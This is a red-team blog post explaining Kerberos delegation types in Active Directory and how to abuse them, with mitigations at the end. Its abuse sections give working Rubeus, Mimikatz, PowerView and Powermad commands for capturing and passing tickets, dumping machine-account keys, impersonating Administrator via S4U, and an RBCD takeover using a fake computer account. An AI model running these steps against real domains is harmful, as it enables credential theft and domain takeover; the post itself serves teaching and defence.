---
layout: post
title: S4fuckMe2selfAndUAndU2proxy - A low dive into Kerberos delegations
---
Hello fellow h4x0rs, this time we are going to have a closer look at the different types of delegations inside an Active Directory.  
We'll try to figure out what this magic is all about and of course how we can abuse it for fun and profit.  

Prepare yourself for some absolute brainfuck and some bonus info if you make it through to the end.  
   
<img src="/images/2022-05-19/psychatrist_meme.png">  

<!--more-->
# Introduction  

It's been some time since I last had the power and will to learn and write about something new, but over the past few weeks the cyber g0ds took control over me again. For whatever reason I decided to dive into delegation attacks, because it is once again a topic I am not capable of to fully understand (which is even the case after writing this blog post). And as mostly all the posts I am writing, this is again to help me understand this topic a little more in detail in the first place.  

So without further ado let's getz happy.  

# Kerberos Delegation  

Just by looking at the word itself, it becomes clear to the reader what it's all about. Someone or something gets something from someone else and does something with it on behalf. In Germany we say: "Klingt komisch, ist aber so".  

<img src="/images/2022-05-19/brainfuck.png"> 

In an Active Directory, delegation enables an account (user, system or service) to act on behalf of another account and do something "as him" - so this account is able to impersonate others, to access additional resources.  
To give you an example:  

A user visits a website hosted on an IIS to which he authenticates to. The website uses a SQL database in the backend, to which data has to be read from as that user. So the webserver gets the ability granted to impersonate that user, and authenticate as him - via Kerberos - to the SQL database and e.g. fetch data from a table only accessible by that user, which is called delegation.  
Microsoft has a good workflow in the official [documents](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SFU/%5bMS-SFU%5d.pdf) - in this case it is the one for Constrained Delegation, but you hopefully get the idea: 

<img src="/images/2022-05-19/workflow.png">

There are three main types of delegation that you might stumple upon in an AD: 

1. Unconstrained Delegation
2. Constrained Delegation
3. Resource Based Constrained Delegation

In the upcoming sections I will use terms like:  

```TGT``` - Ticket Granting Ticket  
```ST``` - Service Ticket  
```KDC``` - Key Distribution Center  
and alike - stuff that goes in the same direction - technology wise  

If you are not familiar with this terminology, I highly recommend you to read my previous blog post about [Kerberoasting](https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/), where all of this stuff is explained. But you can of course just do a lame ass google search :)

So let's dive a little deeper, without getting to technical.  

<img src="/images/2022-05-19/deepdive.png"> 

## Unconstrained Delegation  

Unconstrained Delegation means, that an account is allowed to impersonate ANY user to ANY service. So from an attackers perspective this seems like a really valuable target to to get control over, as it most likely means game over.  

When a user requests a ```ST``` for the webservice from the example above, the KDC will include the user's ```TGT``` inside the ```ST``` for the webservice. The service account is then able to extract and cache the ```TGT``` from the ```ST``` and with that ticket request another ```ST``` as that user for the SQL service, ultimately authentication to that service as the user and not as himself.

The config of an AD object looks like this (all objects that have an ```SPN``` can be configured for delegation):  
<img src="/images/2022-05-19/ucd.png"> 

When a user (```lowpriv``` in this case) accesses the system ```epo``` configured with Unconstrained Delegation enabled:  

<img src="/images/2022-05-19/access.png"> 

The ```TGT``` of that user automagically gets cached. We can use [Rubeus](https://github.com/GhostPack/Rubeus) with the ```triage``` or ```monitor``` function to play along and watch them tickets flying in:  

```
Rubeus.exe monitor /interval:10 /targetuser:lowpriv
``` 

<img src="/images/2022-05-19/saved_TGT.png">  

```
Rubeus.exe triage
``` 

<img src="/images/2022-05-19/triage.png">  


## Constrained Delegation  

In the case of Constrained Delegation we are facing a more restricted variant, which was invented as an answer to face the security issues that arose from the unconstrained version. This time the account can impersonate ANY account but only to specific services on specific hosts.  

What also is different here is, that the server doesn't cache the users ```TGT```s (well the KDC doesn't even include them anymore inside the ```ST```s) but instead is allowed to request a ```ST``` for the destination service for another user, but with his own ```TGT```.  
So it goes like:  
"Hey KDC, it's me the IIS-service account, please give me a ST for SQL/SQL-Server, not for me but for my buddy user1. K. thanks." 

The config inside AD looks like this:  

<img src="/images/2022-05-19/constrained_deleg.png"> 

The system ```epo``` is allowed to delegate to the ```cifs``` service at ```dc2016``` and the ```ldap``` service at ```dc2016-2```.  

To achieve this, Microsoft extended the Kerberos protocol by two extensions, namingly [S4U2self](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13?redirectedfrom=MSDN) and [S4U2proxy](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a).  
To quote Redmond at this stage:  

"The S4U2self extension allows a service to obtain a service ticket to itself on behalf of a user."  
"The Service for User to Proxy (S4U2proxy) extension provides a service that obtains a service ticket to another service on behalf of a user."  

```S4U2self```'s purpose for an account is to be able to get a ```ST``` to itself when the user that needs to be impersonated did NOT authenticate via Kerberos - e.g. we used NTLM to authenticate to a webserver.  
This is called: 
 
<img src="/images/2022-05-19/nyan.png"> 
 
The ticket generated with this extension has the ```forwardable``` flag set, which is a prerequisit for the whole stuff to work. 

<img src="/images/2022-05-19/forwardable.png"> 

```S4U2proxy```'s purpose is to take that forwardable ticket and use it to request a ```ST``` to any SPN specified in the ```msds-allowedtodelegateto``` options for the user specified in the S4U2self part. The verification of if the requesting account is allowed to impersonate users to the service provided is done by the ```KDC```, which looks up the accounts ```msds-allowedtodelegateto``` field and only issues the ```ST``` if there is a match.  
In this case ```epo``` is allowed to delegate to ```cifs```, ```netman``` and ```remoteaccess``` to ```win10x64``` only.

<img src="/images/2022-05-19/allowedtodelegateto.png">


## Resource Based Constrained Delegation

This type of delegation is very often described as just being the same as Constrained Delegation, just that the party granting permissions is the other way around. I personally had so much difficulties in understanding what is meant by that, until I stumbled across [Charlie Bromberg](https://twitter.com/_nwodtuhs)'s awesome [talk](https://www.thehacker.recipes/ad/movement/kerberos/delegations#talk) at Insomni'Hack (please watch it to try to understand this whole topic), where he had this picture on his slide deck:   

<img src="/images/2022-05-19/delegations_overview.png" width="400">  

What is meant by the other way around is, that rather then granting an account the permission to request ```ST```s as another user, you configure an account in a way that it allows other accounts to impersonate him for certain services on certain devices.  

Let's do it together. We want the system ```WIN10X64``` to be able to delegate to the system ```epo```. Instead of editing settings on ```WIN10X64``` like we would have done with Constrained Delegation, we in this case edit the ```msDS-AllowedToActOnBehalfOfOtherIdentity``` attribute of ```epo```, to which we want to delegate to.

Before RBCD set:  

<img src="/images/2022-05-19/before_rbcd.png">

After RBCD set:  

<img src="/images/2022-05-19/after_rbcd.png">

You can set RBCD with the help of the PowerShell AD cmdlets like so (take care of the trailing ```$``` if you want to use computer accounts, as the ```SAMAccountName``` is needed here):  

```
Set-ADComputer <account you want to delegate to> -PrincipalsAllowedToDelegateToAccount <account we want to delegate from>
```

To query an account and see who can delegate via RBCD, we can also user PowerShell again:  

```
$x = Get-ADComputer epo -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
$x.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access
```

Finally to unset RBCD we can set the attribute back to ```$null```:  

```
Set-ADComputer epo -PrincipalsAllowedToDelegateToAccount $null
```

# Finding affected accounts and abusing the shit out of them

Let's get dirty and start with the fun part.  
There are tons of abuse cases and a shitload of delegation attacks described in the Interwebz. Often times [relaying attacks](https://luemmelsec.github.io/Relaying-101/) and tools are relying on RBCD to fully extend their potential. In this section we're going to see how to discover potential accounts and how to attack them.

## Unconstrained Delegation - recon and abuse 

### Recon

If an account is set up for Unconstrained Delegation, it's ```userAccountControl``` attribute contains ```TRUSTED_FOR_DELEGATION```:   

<img src="/images/2022-05-19/uac_set.png">

We can issue [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to get the job done for us:  

```
Get-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol
```

<img src="/images/2022-05-19/uac_powerview.png">  

or my beloved [BloodHound](https://github.com/BloodHoundAD/BloodHound):  

```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

<img src="/images/2022-05-19/bhunconstrained.png"> 

or even the native PowerShell AD cmdlets:  

```
Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl
```
<img src="/images/2022-05-19/ldapsearchfilter.png">  

### Abuse  

The first step is to always compromise an account that is configured for Unconstrained Delegation. This can be a user or a system. For this demo we assume that we compromised the system ```epo``` which is allowed for UD, and that we have control over the user ```service``` which is local admin on this system.

We now either already have a Kerberos ticket, or we coerce authentication to get one ([SpoolSample](https://github.com/leechristensen/SpoolSample), [PetitPotam](https://github.com/topotam/PetitPotam), [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) and alike) or we just wait until an account we want to impersonate accesses our system. In this case the user ```Administrator``` accessed the system via SMB:  

```
.\Rubeus.exe monitor /targetuser:Administrator /interval:5
``` 
As you can see, our current user is not able to access the DC.  

<img src="/images/2022-05-19/rubeus_ticket_monitor.png">

In the next step we pass the ```TGT``` to our current session and are so able to impersonate the admin user and gain acccess to the DC:  

```
.\Rubeus.exe ptt /ticket:doIFczCCBW+g...
```

<img src="/images/2022-05-19/rubeus_impersonate.png">

or to other systems or services:  

<img src="/images/2022-05-19/abuse1.png">


## Constrained Delegation - recon and abuse  

### Recon  

in this example we have the system ```WIN10X64``` configured with Constrained Delegation allowing it to delegate to ```cifs\epo.mcafeelab.local```:  

<img src="/images/2022-05-19/cd_win10.png"> 

We can use [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) and filter the results on the ```msDS-AllowedToDelegateTo``` value:  

<img src="/images/2022-05-19/adexplorer1.png">

or BloodHound:  

```
MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p
```
<img src="/images/2022-05-19/bh_cdquery.png">

or PowerView:  

```
Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft
``` 
<img src="/images/2022-05-19/pv_cd.png">

```Be aware that Constrained Delegation can be set on users as well, so make sure to also search for them in your queries!!!```  

### Abuse  

We somewhat need to get hold on a ```TGT``` from the account that holds the Constrained Delegation rights. We can achieve that if we have the cleartext password or NT hash of the affected account, or directly dump the ```TGT``` with Rubeus if we have according privileges.  

#### Rubeus way  

First we look for the ```krbtgt``` ticket for the user ```win10x64$```

```
Rubeus.exe triage
```
<img src="/images/2022-05-19/dump.png">

Then we dump the ticket from the luid:  

```
Rubeus.exe dump /luid:0x12d1f7
```
<img src="/images/2022-05-19/dump1.png">

And finally use that ticket to do the S4U magic:  

```
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/epo.mcafeelab.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
```
<img src="/images/2022-05-19/cd1.png">

<img src="/images/2022-05-19/cd2.png">

We can see with ```klist``` that we successfully obtained a forwardable ticket for cifs/epo.mcafeelab.local for the user ```Administrator```, with which we can access ```epo``` now via ```cifs``` but not e.g. ```wsman```:  

<img src="/images/2022-05-19/cd3.png">

#### [Mimikatzi](https://github.com/gentilkiwi/mimikatz) way

This time we are going to obtain the aes256 key of the machine account:

```
privilege::debug
token::elevate
sekurlsa::ekeys
```
<img src="/images/2022-05-19/mimi1.png">

<img src="/images/2022-05-19/mimi2.png">

For whatever reason the output of mimikatz would not show me the correct descriptions. There were people in the past with the same [problem](https://github.com/gentilkiwi/mimikatz/issues/314). However the first entry under the ```Key List``` section is in fact the aes256 key.  

Then it's nearly the same with Rubeus as before, but this time with the system account as user and aes256 key as the "password":  

```
Rubeus.exe s4u /impersonateuser:god /msdsspn:cifs/epo.mcafeelab.local /user:win10x64$ /aes256:4b55f...fd82 /ptt

```
<img src="/images/2022-05-19/rubi1.png">

<img src="/images/2022-05-19/rubi2.png">

What is really cool about this type of attacks is, that we don`t need any info about the passwords of the users we want to impersonate. We can just say: "KDC, I want a ticket for user X - gimme that!".  

## Resource Based Constrained Delegation - recon and abuse 

### Recon  

We can again issue ADExplorer, the AD PowerShell cmdlets, BloodHound or PowerView to search for affected accounts like described in the Constrained Delegation part.  

```
Get-ADComputer epo -Properties PrincipalsAllowedToDelegateToAccount
```
<img src="/images/2022-05-19/rbcd_allowed.png">

### Abuse  

The idea is that as soon as you have control over an account's ```msDS-AllowedToActOnBehalfOfOtherIdentity``` property, you can place an SPN there and are ready to go to pwn this account. The scenario fits to computer objects as well as users, with the difference that by default a user can't alter it's own settings but a computer can.  
So this is leading us to either have the luck to have compromised an account with the according rights over our target or we are in MitM position and can relay to AD accordingly. If you want to know how this fancy shit is working -> [Relaying 101](https://luemmelsec.github.io/Relaying-101/).  


For the course of this writeup, let's assume that our user ```lowpriv``` happens to have these rights over the system ```epo```:  

<img src="/images/2022-05-19/write_rights.png">

In an on-prem AD the default settings allow the group ```Authenticated Users``` (which includes all computers and users) to add up to 10 computer objects to the AD. To check if this is possible, let's use PowerView's ```Get-DomainObject``` cmdlet:  

```
Get-DomainObject -Identity "dc=mcafeelab,dc=local" -domain mcafeelab.local -Properties distinguishedname,ms-ds-machineaccountquota
```

<img src="/images/2022-05-19/quota.png">

Besides the quota, our pwnd user must be allowed to actually add computer objects, and this is controlled by the ```Default Domain Controllers Policy``` with the ```Add workstations to domain``` security setting, which by default contains (who would have thought) the ```Authenticated Users``` group:  

<img src="/images/2022-05-19/authenticated_users.png">

If you know of a cool way to fetch this info the hacker-way, please let me know.  

Okay, so the prerequisites are in place. So let's add a new computer object to the domain with the help of [Powermad](https://github.com/Kevin-Robertson/Powermad):  

```
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Pillemann123' -AsPlainText -Force) -Verbose
```
<img src="/images/2022-05-19/mad.png">

Now it's time to set our ```FAKE01``` account to the ```msDS-AllowedToActOnBehalfOfOtherIdentity``` option of ```epo``` with the PowerShell AD cmdlets:  

```
Add-WindowsCapability –online –Name “Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0”
Set-ADComputer epo -PrincipalsAllowedToDelegateToAccount FAKE01$
```
<img src="/images/2022-05-19/addfake.png"> 

Lastly some 

<img src="/images/2022-05-19/magic.png"> 

```
Rubeus.exe hash /password:Pillemann123
Rubeus.exe s4u /impersonateuser:administrator /msdsspn:cifs/epo.mcafeelab.local /domain:mcafeelab.local /user:FAKE01$ /rc4:0CF95DC54D380336A0A671B758A35834 /ptt
```
<img src="/images/2022-05-19/rbcdabuse1.png"> 
<img src="/images/2022-05-19/rbcdabuse2.png">  

BOOM - we made it.  

## Bonus material  

If you made it till here you are awesome.  
I want to shortly scratch the top of two more topics.  

### Protocol transition

Remember the part where I introduced you to Constrained Delegation? I only focused on the scenario where it was configured to ```Use any authentication protocol```. But what about the other option ```Use Kerberos only```?  
In these cases the ```S4U2self``` request will give you a nonforwardable ticket if the user didn't authenticate via Kerberos, which ultimately makes ```S4U2proxy``` fail. So everything that is no Kerberos authentication to that account is not abuseable.  
You can take a closer look at [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#without-protocol-transition).  

### Alternate Service Name  

If we happen to land in a situation where we can abuse Constrained Delegation, but the service we can delegate to is of no use like e.g. ```wsman``` because the service is not running on the target, we can add any other service to our ticket, as they are not validated at all.

<img src="/images/2022-05-19/bonus1.png"> 

If we do our S4U magic, we get a valid ST but can't access ```epo```:  

```
Rubeus.exe s4u /impersonateuser:god /msdsspn:wsman/epo.mcafeelab.local /user:win10x64$ /aes256:4b55fdf5d7d3ca7c537ca7de3bf212b515759fcfe406a0df87a04d4158b4fd82 /ptt
```
<img src="/images/2022-05-19/bonus2.png"> 

But if we specify the ```/altservice``` flag with e.g. ```cifs```:  

```
Rubeus.exe s4u /impersonateuser:god /msdsspn:wsman/epo.mcafeelab.local /user:win10x64$ /aes256:4b55fdf5d7d3ca7c537ca7de3bf212b515759fcfe406a0df87a04d4158b4fd82 /ptt /altservice:cifs
```
<img src="/images/2022-05-19/bonus3.png">

<img src="/images/2022-05-19/total-pwnage.jpg">

<img src="/images/2022-05-19/bonus4.png">


# Mitigations  

In general you should use the safest options available if you need to use delegations. This is -> don't use Unconstrained Delegation at all - no really don't.  

All your sensitive accounts should either be members of the ```Protected Users``` group or have the flag ```Account is sensitive and cannot be delegated``` set:  

<img src="/images/2022-05-19/miti1.png">

For the RBCD stuff make sure that the Account quota is set to 0 and that your default DC policy only allows privileged accounts to add workstations to your domain. And no, the quota setting is NOT affecting your Domain Admins:  

[https://twitter.com/theluemmel/status/1473315566945460230](https://twitter.com/theluemmel/status/1473315566945460230)  
<img src="/images/2022-05-19/miti2.png">

# Conclusion 

Wow, this blog post got a little out of hand. I still don't understand half the shit I would like to, but man, writing this down and testing things out really gave me a good first glance into this very specific and complex topic.  
Just be aware of the consequences a (mis)configuration of delegations might have.  

So I once again hope you enjoyed the read.  
Stay safe and happy hacking.  

If you happen to have any technical questions, please directly contact the people from the "Thank you" section :)

Luemmel  

# Thanks to
all the great people that i learnt from by reading their stuff or doing trainings they provide  

[Daniel Duggan](https://twitter.com/_RastaMouse)  
[Charlie Bromberg](https://twitter.com/_nwodtuhs)  
[Will Schroeder](https://twitter.com/harmj0y)  
[Elad Shamir](https://twitter.com/elad_shamir)  
[Sean Metcalf](https://twitter.com/PyroTek3)  
[an0n](https://twitter.com/an0n_r0)  
[spotheplanet](https://twitter.com/spotheplanet)  
[Kevin Robertson](https://twitter.com/kevin_robertson)  
[Benjamin Delpy](https://twitter.com/gentilkiwi)  

# Sources  
[https://courses.zeropointsecurity.co.uk/courses/red-team-ops](https://courses.zeropointsecurity.co.uk/courses/red-team-ops)  
[https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)  
[https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c](https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c)  
[https://www.thehacker.recipes/ad/movement/kerberos/delegations/](https://www.thehacker.recipes/ad/movement/kerberos/delegations/)  
[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/(resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)  
[https://stealthbits.com/blog/what-is-the-kerberos-pac/](https://stealthbits.com/blog/what-is-the-kerberos-pac/)  
[https://blog.harmj0y.net/redteaming/another-word-on-delegation/](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)  
[https://adsecurity.org/?p=1667](https://adsecurity.org/?p=1667)   
[https://github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)  
[https://orangecyberdefense.com/global/blog/sensepost/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/](https://orangecyberdefense.com/global/blog/sensepost/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/)  
[https://docs.microsoft.com/en-us/defender-for-identity/cas-isp-unconstrained-kerberos](https://docs.microsoft.com/en-us/defender-for-identity/cas-isp-unconstrained-kerberos)  
[https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/ps-remoting-second-hop?view=powershell-7.2](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/ps-remoting-second-hop?view=powershell-7.2)  